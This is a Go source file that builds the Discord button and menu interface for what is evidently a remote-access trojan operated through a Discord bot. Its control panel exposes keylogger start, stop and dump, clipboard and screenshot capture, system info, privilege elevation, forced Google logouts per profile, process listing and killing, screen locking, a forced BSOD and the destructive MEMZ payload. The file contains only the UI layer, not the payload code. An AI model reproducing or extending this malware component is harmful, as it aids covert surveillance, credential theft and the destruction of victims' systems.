package ui

import (
	"encoding/json"
	"fmt"

	"github.com/bwmarrin/discordgo"
)

type wireButton struct {
	Label    string
	Style    discordgo.ButtonStyle
	CustomID string
	Disabled bool
}

func (wireButton) Type() discordgo.ComponentType { return discordgo.ButtonComponent }

func (b wireButton) MarshalJSON() ([]byte, error) {
	return json.Marshal(struct {
		Type     discordgo.ComponentType `json:"type"`
		Label    string                  `json:"label"`
		Style    discordgo.ButtonStyle   `json:"style"`
		CustomID string                  `json:"custom_id,omitempty"`
		Disabled bool                    `json:"disabled,omitempty"`
	}{
		Type:     discordgo.ButtonComponent,
		Label:    b.Label,
		Style:    b.Style,
		CustomID: b.CustomID,
		Disabled: b.Disabled,
	})
}

type wireOption struct {
	Label       string `json:"label"`
	Value       string `json:"value"`
	Description string `json:"description,omitempty"`
}

type wireSelect struct {
	CustomID    string
	Placeholder string
	MinValues   int
	MaxValues   int
	Options     []wireOption
}

func (wireSelect) Type() discordgo.ComponentType {
	return discordgo.ComponentType(discordgo.StringSelectMenu)
}

func (s wireSelect) MarshalJSON() ([]byte, error) {
	return json.Marshal(struct {
		Type        discordgo.ComponentType `json:"type"`
		CustomID    string                  `json:"custom_id"`
		Placeholder string                  `json:"placeholder,omitempty"`
		MinValues   int                     `json:"min_values,omitempty"`
		MaxValues   int                     `json:"max_values,omitempty"`
		Options     []wireOption            `json:"options"`
	}{
		Type:        discordgo.ComponentType(discordgo.StringSelectMenu),
		CustomID:    s.CustomID,
		Placeholder: s.Placeholder,
		MinValues:   s.MinValues,
		MaxValues:   s.MaxValues,
		Options:     s.Options,
	})
}

func Button(label string, style discordgo.ButtonStyle, customID string) discordgo.MessageComponent {
	return wireButton{Label: label, Style: style, CustomID: customID}
}

func ControlPanel() []discordgo.MessageComponent {
	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("📸 Screenshot", discordgo.PrimaryButton, "btn_screenshot"),
			Button("💻 SysInfo", discordgo.PrimaryButton, "btn_sysinfo"),
			Button("📋 Clipboard", discordgo.PrimaryButton, "btn_clipboard"),
			Button("🔑 Keylog Dump", discordgo.PrimaryButton, "btn_keylog_dump"),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🚪 Logout Google", discordgo.DangerButton, "btn_google_close"),
			Button("☠️ MEMZ", discordgo.DangerButton, "btn_memz"),
			Button("📂 Processes", discordgo.DangerButton, "btn_ps"),
			Button("💀 BSOD", discordgo.DangerButton, "btn_bsod"),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🔌 Shutdown Agent", discordgo.SecondaryButton, "btn_shutdown"),
			Button("📡 Reconectar", discordgo.SecondaryButton, "btn_reconnect"),
			Button("🛡️ Elevate", discordgo.SecondaryButton, "btn_elevate"),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("▶️ Start Keylog", discordgo.SuccessButton, "btn_keylog_start"),
			Button("⏹ Stop Keylog", discordgo.SecondaryButton, "btn_keylog_stop"),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🔒 Lock Screen", discordgo.DangerButton, "btn_lock_on"),
			Button("🔓 Unlock", discordgo.SuccessButton, "btn_lock_off"),
		}},
	}
}

func GooglePanel(selected int, options []discordgo.SelectMenuOption) []discordgo.MessageComponent {
	if len(options) > 25 {
		options = options[:25]
	}

	converted := make([]wireOption, 0, len(options))
	for _, option := range options {
		converted = append(converted, wireOption{
			Label:       option.Label,
			Value:       option.Value,
			Description: option.Description,
		})
	}

	closeOne := wireButton{
		Label:    "🚪 Cerrar seleccionado",
		Style:    discordgo.DangerButton,
		CustomID: fmt.Sprintf("btn_google_one_%d", selected),
		Disabled: selected < 0,
	}

	if len(converted) == 0 {
		return []discordgo.MessageComponent{
			discordgo.ActionsRow{Components: []discordgo.MessageComponent{
				Button("🔄 Actualizar", discordgo.SecondaryButton, "btn_google_refresh"),
			}},
		}
	}

	menu := wireSelect{
		CustomID:    "sel_google_profile",
		Placeholder: "Selecciona un perfil de Google",
		MinValues:   1,
		MaxValues:   1,
		Options:     converted,
	}

	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{menu}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🔄 Actualizar", discordgo.SecondaryButton, "btn_google_refresh"),
			closeOne,
			Button("💥 Cerrar todas", discordgo.DangerButton, "btn_google_all"),
		}},
	}
}

func MemzResultPanel() []discordgo.MessageComponent {
	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🛑 Detener MEMZ", discordgo.SecondaryButton, "btn_memz_abort"),
		}},
	}
}

func GoogleResultPanel() []discordgo.MessageComponent {
	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			Button("🔄 Volver al panel", discordgo.SecondaryButton, "btn_google_refresh"),
			Button("💥 Cerrar todas", discordgo.DangerButton, "btn_google_all"),
		}},
	}
}

func ProcessSelect(page int, options []discordgo.SelectMenuOption) []discordgo.MessageComponent {
	if len(options) > 25 {
		options = options[:25]
	}
	converted := make([]wireOption, 0, len(options))
	for _, option := range options {
		converted = append(converted, wireOption{
			Label:       option.Label,
			Value:       option.Value,
			Description: option.Description,
		})
	}
	menu := wireSelect{
		CustomID:    fmt.Sprintf("sel_ps_%d", page),
		Placeholder: fmt.Sprintf("Selecciona un proceso — página %d", page+1),
		MinValues:   1,
		MaxValues:   1,
		Options:     converted,
	}
	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{menu}},
	}
}

func ProcessNav(page, totalPages int) []discordgo.MessageComponent {
	if totalPages <= 1 {
		return nil
	}
	prev := wireButton{
		Label:    "◀ Anterior",
		Style:    discordgo.SecondaryButton,
		CustomID: fmt.Sprintf("btn_ps_page_%d", page-1),
		Disabled: page <= 0,
	}
	next := wireButton{
		Label:    "Siguiente ▶",
		Style:    discordgo.SecondaryButton,
		CustomID: fmt.Sprintf("btn_ps_page_%d", page+1),
		Disabled: page >= totalPages-1,
	}
	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{prev, next}},
	}
}
